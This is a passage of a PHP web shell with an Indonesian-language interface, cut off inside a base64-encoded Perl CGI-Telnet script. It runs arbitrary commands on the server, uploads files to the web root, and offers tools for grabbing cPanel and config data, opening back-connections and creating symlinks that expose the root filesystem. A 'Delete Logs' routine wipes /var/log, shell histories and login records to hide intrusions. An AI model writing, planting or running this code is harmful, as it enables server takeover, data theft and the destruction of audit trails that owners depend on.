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) format('woff');
    font-weight: normal;
    font-style: normal;

}

html {
background:black;
    color: #ffffff;
    font-family:ubuntu_monoregular;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;border:1;

	font-size: 11px;
	width: 100%;
    }
  .jancok {
  display: inline-block;
    padding: 3px 6px;
    margin-bottom: 0;
    font-size: 12px;
    
    border:1px solid #191919;
    text-align: left;
    white-space: nowrap;
}
#nav{position:fixed;z-index:999;top:0;width:100%;left:80%;
}
a.nav-fokus {display:block; width:auto; height:auto; background:#191919; border-top:0px; border-left: 1px solid #fff; border-right:1px solid #fff;  border-bottom:1px solid #fff;  padding:5px 8px; text-align:center; text-decoration:none; color:red; line-height:20px; overflow:hidden; float:left;
}
a.nav-fokus:hover {color:#FFFFFF; background:#191919; border-top:0px; border-left: 1px solid #fff; border-right:1px solid #fff;  border-bottom:1px solid #fff;
}
#menu a {
     font-family:ubuntu_monoregular;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;border:1;
     font-size: 12px;
     background:#191919;
     color:white;
     margin:5px 2px 4px 2px;
     padding:5px 8px;
     border-color: cyan;
     text-decoration:none;
     letter-spacing:1px;
     -moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
       }
#menu a:hover {
     font-size: 12px;
     background:#191919;-webkit-transform:rotate(0.0deg);-moz-transform:rotate(0.0deg);-ms-transform:rotate(0.0deg);-o-transform:rotate(0.0deg);transform:rotate(0.0deg);
     color: white;
     padding:5px 8px;
     margin:1px;
     border: 1px;
     font-family:ubuntu_monoregular;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;border:1;
     letter-spacing:1px;
     margin:5px 2px 4px 2px;
        -moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
       }


li {
	display: inline;
	margin: 1px;
	padding: 1px;
}
.a_exp a:hover{
text-decoration: underline;
}
textarea{
        background:transparent;
	border: 1px solid #2d2b2b;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	font-family:Homenaje;
	color: #ffffff;
	font-size:13px;
}
input,select{
	background:transparent;
	color:white;
	margin:0 10px;
	font-family:Homenaje;
	font-size:13px;
	border:2px solid #2d2b2b;
}
li a{
color:#fff;text-decoration: none;background:#333;padding:3px;margin:3px;
}
li a:hover{
color:#fff;background:white;text-decoration: none;
}
thead{
background:#333;color:#fff;
}
a:hover{
text-decoration: underline;
}
.a_phpinfo{
background:#000;color:#fff;border:1px solid #fff;text-align:center;
}
.a_phpinfo th,.a_phpinfo tr,.a_phpinfo td{
border-collapse:collapse;border:1px solid white;
}
option{
background:#000;color:white;border:0;}
}
.table_home, .td_home {
    border: 1px solid #191919;
}
.table_home td:hover {
    background: #191919;
}
.th_home {
    font-family:ubuntu_monoregular;
     font-size: 12px;
     background:#191919;
     color:white;
     border-color: #191919;
     text-decoration:none;
     letter-spacing:2px;
}
table, th, td {
    font-family:ubuntu_monoregular;
    background: black;
    font-size: 13px;
}

th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: white;
	text-decoration: underline;
    font-family:ubuntu_monoregular;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;border:1;

}
b {
	color: white;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color:white;
	margin:0 10px;
	font-family:Homenaje;
	font-size:13px;
	border:2px solid #2d2b2b;
}
input[type=submit] {
	background: transparent; 
	color:white;
	margin:0 10px;
	font-family:Homenaje;
	font-size:13px;
	border:2px solid #2d2b2b;

}
option:hover {
background:#000;color:white;border:0;}

}.a_exp{border:1px solid #fff;border-collapse: collapse;
}
.mybox{-moz-border-radius: 10px; border-radius: 10px;border:1px solid #ff0000; padding:4px 2px;width:70%;line-height:24px;background:none;box-shadow: 0px 4px 2px white;-webkit-box-shadow: 0px 4px 2px #ff0000;-moz-box-shadow: 0px 4px 2px #ff0000;}
.cgx2 {text-align: center;letter-spacing:1px;font-family: "orbitron";color: #ff0000;font-size:25px;text-shadow: 5px 5px 5px black;}
.infoweb {
	border-right: 1px solid #00FFFF;
}
    </style>
</head>
<center>
<div class="container">
<table width=100% align=center>
  <?php
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=white>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=white>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	}
}
    function GrabUrl($url,$type){

        $urlArray = array();

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);

        $regex='|<a.*?href="(.*?)"|';
        preg_match_all($regex,$result,$parts);
        $links=$parts[1];
        foreach($links as $link){
            array_push($urlArray, $link);
        }
        curl_close($ch);

        foreach($urlArray as $value){
            $lol="$url$value";
			if(preg_match("#$type#is", $lol)) {
				echo "$lol\r\n";
			}
        }
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
}
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
  @ini_set('display_errors', 0);
  function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:'><font color=#DD4736><b>".$disablefunc."</b></font></span>"; }
    else { return "<span style='color:#00FF1E'><b>NONE</b></span>"; }
    }
  $x = @php_uname();
  $d = showdisablefunctions().' <font color=white>on</font> <font color=teal>'.php_sapi_name().'</font>';
  $sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
  $soft = getenv("SERVER_SOFTWARE");
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$mysql = (function_exists('mysql_connect')) ? "<font color=white>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=white>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=white>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=white>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=white>ON</font>" : "<font color=red>OFF</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
  echo '
<table width=100% align=center>
 
<th></th>
<tr>
<td class="jancok" align=right><font color=white>Software  </font></td><td class="jancok" align=left><font color=red> '.$soft.'</font></td></tr><tr>
<td class="jancok" align=right><font color=white>System OS  </font></td><td class="jancok" align=left><font color=red> '.$x.'</font></td></tr>
<tr><td class="jancok" align=right><font color=white>IP info</font></td><td class="jancok" align=left><font color=red> IP SERVER : '.gethostbyname($_SERVER['HTTP_HOST']).' <font color=white>|</font> YOUR IP : '.$_SERVER['REMOTE_ADDR'].'</font></td></tr> <tr><td class="jancok" align=right><font color=white>User</font></td><td class="jancok" align=left><font color=red> '.$user.' ('.$uid.') Group: '.$group.' ('.$gid.')</font></td></tr><tr><td class="jancok" align=right><font color=white>Storage</font></td><td class="jancok" align=left><font color=red> <font color=white>'.$used.'</font> / <font color=white>'.$total.'</font> ( Free: <font color=white>'.$freespace.'</font> )</font></td></tr>
<tr><td class="jancok" align=right><font color=white>Info</font></td><td class="jancok" align=left><font color=red>MySQL: '.$mysql.' | Perl: '.$perl.' | Python: '.$python.' | WGET: '.$wget.' | CURL: '.$curl.' </font></td></tr>
<tr><td class="jancok" align=right><font color=white>Safe Mode</font></td><td class="jancok" align=left><font color=red> '.$sm.'</font></td></tr>
<tr><td class="jancok" align=right><font color=white>Disabled  </font></td><td class="jancok" align=left><font color=red> '.$d.'</font></td></tr>
<tr><td class="jancok" align=right><font color=white>Current Dir  </font></td><td class="jancok" align=left><font color=red>';
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo '</font></td></tr></table>';
echo "<br><br>";
echo "<div id='menu'>";
echo "<center>";
echo "
<a href='?dir=$dir&jancok=upload'>Upload</a>
<a href='?dir=$dir&jancok=cmd'>Command</a>
<a href='?dir=$dir&jancok=mass'>Mass</a>
<a href='?dir=$dir&jancok=adminer'>Adminer</a>
<a href='?dir=$dir&jancok=jumping'>Jumping</a>
<a href='?dir=$dir&jancok=cpanel'>Grab Cpanel</a>
<a href='?dir=$dir&jancok=cgi'>Cgi Telnet</a>
<a href='?dir=$dir&config=grabber'>Config Tools</a>
<a href='?dir=$dir&mass=changer'>Mass User Changer</a>
<a href='?dir=$dir&backconnect=tool'>Back Connect Tools</a>
<a href='?dir=$dir&symlink=tool'>Symlink Tools</a>
<a href='?dir=$dir&bypass=tool'>Bypass Tools</a>";
echo "</ul></div></center>";
echo "<div id='nav'>
<a class='nav-fokus' href='?'><b>Home</b></a><a class='nav-fokus' href='?dir=$dir&delete=logs'><b>Delete Logs</b></a><a class='nav-fokus' href='?dir=$dir&kill=self'><b>Kill Self</b></a><a class='nav-fokus' href='?dir=$dir&jancok=logout'><b>Log-Out</b></a></div>";
echo "<br>";
echo "<hr color='#191919'>";
echo "<br>";
if($_GET['jancok'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=white>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=white>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		}
	}
	echo "Upload File:
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;
	echo "</center>";
} elseif($_GET['delete'] == 'logs') {
  	echo '<br><center><b><span>Delete Logs ( For Safe )</span></b><center><br>';
	echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";      
	exec("rm -rf /tmp/logs");
	exec("rm -rf /root/.ksh_history");
	exec("rm -rf /root/.bash_history");
	exec("rm -rf /root/.bash_logout");
	exec("rm -rf /usr/local/apache/logs");
	exec("rm -rf /usr/local/apache/log");
	exec("rm -rf /var/apache/logs");
	exec("rm -rf /var/apache/log");
	exec("rm -rf /var/run/utmp");
	exec("rm -rf /var/logs");
	exec("rm -rf /var/log");
	exec("rm -rf /var/adm");
	exec("rm -rf /etc/wtmp");
	exec("rm -rf /etc/utmp");
	exec("rm -rf $HISTFILE");
	exec("rm -rf /var/log/lastlog");
	exec("rm -rf /var/log/wtmp");

	shell_exec("rm -rf /tmp/logs");
	shell_exec("rm -rf /root/.ksh_history");
	shell_exec("rm -rf /root/.bash_history");
	shell_exec("rm -rf /root/.bash_logout");
	shell_exec("rm -rf /usr/local/apache/logs");
	shell_exec("rm -rf /usr/local/apache/log");
	shell_exec("rm -rf /var/apache/logs");
	shell_exec("rm -rf /var/apache/log");
	shell_exec("rm -rf /var/run/utmp");
	shell_exec("rm -rf /var/logs");
	shell_exec("rm -rf /var/log");
	shell_exec("rm -rf /var/adm");
	shell_exec("rm -rf /etc/wtmp");
	shell_exec("rm -rf /etc/utmp");
	shell_exec("rm -rf $HISTFILE");
	shell_exec("rm -rf /var/log/lastlog");
	shell_exec("rm -rf /var/log/wtmp");

	passthru("rm -rf /tmp/logs");
	passthru("rm -rf /root/.ksh_history");
	passthru("rm -rf /root/.bash_history");
	passthru("rm -rf /root/.bash_logout");
	passthru("rm -rf /usr/local/apache/logs");
	passthru("rm -rf /usr/local/apache/log");
	passthru("rm -rf /var/apache/logs");
	passthru("rm -rf /var/apache/log");
	passthru("rm -rf /var/run/utmp");
	passthru("rm -rf /var/logs");
	passthru("rm -rf /var/log");
	passthru("rm -rf /var/adm");
	passthru("rm -rf /etc/wtmp");
	passthru("rm -rf /etc/utmp");
	passthru("rm -rf $HISTFILE");
	passthru("rm -rf /var/log/lastlog");
	passthru("rm -rf /var/log/wtmp");


	system("rm -rf /tmp/logs");
	sleep(2);
	echo'<br>Deleting .../tmp/logs ';
	sleep(2);

	system("rm -rf /root/.bash_history");
	sleep(2);
	echo'<p>Deleting .../root/.bash_history </p>';

	system("rm -rf /root/.ksh_history");
	sleep(2);
	echo'<p>Deleting .../root/.ksh_history </p>';

	system("rm -rf /root/.bash_logout");
	sleep(2);
	echo'<p>Deleting .../root/.bash_logout </p>';

	system("rm -rf /usr/local/apache/logs");
	sleep(2);
	echo'<p>Deleting .../usr/local/apache/logs </p>';

	system("rm -rf /usr/local/apache/log");
	sleep(2);
	echo'<p>Deleting .../usr/local/apache/log </p>';

	system("rm -rf /var/apache/logs");
	sleep(2);
	echo'<p>Deleting .../var/apache/logs </p>';

	system("rm -rf /var/apache/log");
	sleep(2);
	echo'<p>Deleting .../var/apache/log </p>';

	system("rm -rf /var/run/utmp");
	sleep(2);
	echo'<p>Deleting .../var/run/utmp </p>';

	system("rm -rf /var/logs");
	sleep(2);
	echo'<p>Deleting .../var/logs </p>';

	system("rm -rf /var/log");
	sleep(2);
	echo'<p>Deleting .../var/log </p>';

	system("rm -rf /var/adm");
	sleep(2);
	echo'<p>Deleting .../var/adm </p>';

	system("rm -rf /etc/wtmp");
	sleep(2);
	echo'<p>Deleting .../etc/wtmp </p>';

	system("rm -rf /etc/utmp");
	sleep(2);
	echo'<p>Deleting .../etc/utmp </p>';

	system("rm -rf $HISTFILE");
	sleep(2);
	echo'<p>Deleting ...$HISTFILE </p>'; 

	system("rm -rf /var/log/lastlog");
	sleep(2);
	echo'<p>Deleting .../var/log/lastlog </p>';

	system("rm -rf /var/log/wtmp");
	sleep(2);
	echo'<p>Deleting .../var/log/wtmp </p>';

	sleep(4);

	echo '<br><br><p>Your Traces Has Been Successfully Deleting ...From the Server';
	echo"</td></tr></table>";
} elseif($_GET['bypass'] == 'vhosts') {
        echo "<div id='menu'><center><a href='?dir=$dir&bypass=disablefunc'>Disable Functions</a><a href='?dir=$dir&bypass=passwd'>Bypass /etc/passwd</a><a href='?dir=$dir&bypass=vhostss'>Bypass Vhosts</a></div>";
	echo "<form method='POST' action=''>";
	echo "<center><br><font size='6'>Bypass Symlink vHost</font><br><br>";
	echo "<center><input type='submit' value='Bypass it' name='Colii'></center>";
		if (isset($_POST['Colii'])){
                        mkdir('symvhosts', 0755);
                        chdir('symvhosts');
                        system('ln -s / Rintoar.txt');
			$fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw';
			$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Bok3p = symlink("/","Rintoar.txt");
			$rt="<br><a href=symvhosts/Rintoar.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
	Bypassed Successfully</b></font></a>";
	echo "<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br>$rt<br>Note: Apabila Forbidden pas buka /var/www/vhosts/Domain.com/ harap tambahkan httpdocs ex:/var/www/vhosts/Domain.com/httpdocs/</center>";} echo "</form>";
} elseif($_GET['jancok'] == 'cgi') {
	$cgi_dir = mkdir('brudul_cgi', 0755);
        chdir('brudul_cgi');
	$file_cgi = "cgi.brudul";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .brudul \n AddHandler cgi-script .brudul \n AddHandler cgi-script .brudul";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQp1c2UgTUlNRTo6QmFzZTY0Ow0KJFZlcnNpb249ICJDR0ktVGVsbmV0IFZlcnNpb24gMS4zIjsNCiRFZGl0UGVyc2lvbj0iPGZvbnQgc3R5bGU9J3RleHQtc2hhZG93OiAwcHggMHB4IDZweCByZ2IoMjU1LCAwLCAwKSwgMHB4IDBweCA1cHggcmdiKDMwMCwgMCwgMCksIDBweCAwcHggNXB4IHJnYigzMDAsIDAsIDApOyBjb2xvcjojZmZmZmZmOyBmb250LXdlaWdodDpib2xkOyc+YjM3NGsgLSBDR0ktVGVsbmV0PC9mb250PiI7DQoNCiRQYXNzd29yZCA9ICJ4YWlzeW5kaWNhdGUiOwkJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcyB0byBsb2dpbi4NCnN1YiBJc19XaW4oKXsNCgkkb3MgPSAmdHJpbSgkRU5WeyJTRVJWRVJfU09GVFdBUkUifSk7DQoJaWYoJG9zID1+IG0vd2luL2kpew0KCQlyZXR1cm4gMTsNCgl9DQoJZWxzZXsNCgkJcmV0dXJuIDA7DQoJfQ0KfQ0KJFdpbk5UID0gJklzX1dpbigpOwkJCQkjIFlvdSBuZWVkIHRvIGNoYW5nZSB0aGUgdmFsdWUgb2YgdGhpcyB0byAxIGlmDQoJCQkJCQkJCSMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3JpcHQgb24gYSBXaW5kb3dzIE5UDQoJCQkJCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91DQoJCQkJCQkJCSMgY2FuIGxlYXZlIHRoZSB2YWx1ZSBhcyBpdCBpcy4NCg0KJE5UQ21kU2VwID0gIiYiOwkJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcw0KCQkJCQkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFdpbmRvd3MgTlQuDQoNCiRVbml4Q21kU2VwID0gIjsiOwkJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcw0KCQkJCQkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFVuaXguDQoNCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTAwMDA7CSMgVGltZSBpbiBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkDQoJCQkJCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzDQoJCQkJCQkJCSMgdXNlZnVsIGZvciBjb21tYW5kcyB0aGF0IG1heSBoYW5nIG9yIHRoYXQNCgkJCQkJCQkJIyB0YWtlIHZlcnkgbG9uZyB0byBleGVjdXRlLCBsaWtlICJmaW5kIC8iLg0KCQkJCQkJCQkjIFRoaXMgaXMgdmFsaWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzDQoJCQkJCQkJCSMgaWdub3JlZCBvbiBOVCBTZXJ2ZXJzLg0KDQokU2hvd0R5bmFtaWNPdXRwdXQgPSAxOwkJCSMgSWYgdGhpcyBpcyAxLCB0aGVuIGRhdGEgaXMgc2VudCB0byB0aGUNCgkJCQkJCQkJIyBicm93c2VyIGFzIHNvb24gYXMgaXQgaXMgb3V0cHV0LCBvdGhlcndpc2UNCgkJCQkJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kDQoJCQkJCQkJCSMgY29tcGxldGVzLiBUaGlzIGlzIHVzZWZ1bCBmb3IgY29tbWFuZHMgbGlrZQ0KCQkJCQkJCQkjIHBpbmcsIHNvIHRoYXQgeW91IGNhbiBzZWUgdGhlIG91dHB1dCBhcyBpdA0KCQkJCQkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4NCg0KIyBET04nVCBDSEFOR0UgQU5ZVEhJTkcgQkVMT1cgVEhJUyBMSU5FIFVOTEVTUyBZT1UgS05PVyBXSEFUIFlPVSdSRSBET0lORyAhIQ0KDQokQ21kU2VwID0gKCRXaW5OVCA/ICROVENtZFNlcCA6ICRVbml4Q21kU2VwKTsNCiRDbWRQd2QgPSAoJFdpbk5UID8gImNkIiA6ICJwd2QiKTsNCiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOw0KJFJlZGlyZWN0b3IgPSAoJFdpbk5UID8gIiAyPiYxIDE+JjIiIDogIiAxPiYxIDI+JjEiKTsNCiRjb2xzPSAxNTA7DQokcm93cz0gMjY7DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQNCiMgcGFyc2VzIEdFVCwgUE9TVCBhbmQgbXVsdGlwYXJ0L2Zvcm0tZGF0YSB0aGF0IGlzIHVzZWQgZm9yIHVwbG9hZGluZyBmaWxlcy4NCiMgVGhlIGZpbGVuYW1lIGlzIHN0b3JlZCBpbiAkaW57J2YnfSBhbmQgdGhlIGRhdGEgaXMgc3RvcmVkIGluICRpbnsnZmlsZWRhdGEnfS4NCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YNCiMgdGhlIHZhcmlhYmxlLiBOb3RlOiBNb3N0IG9mIHRo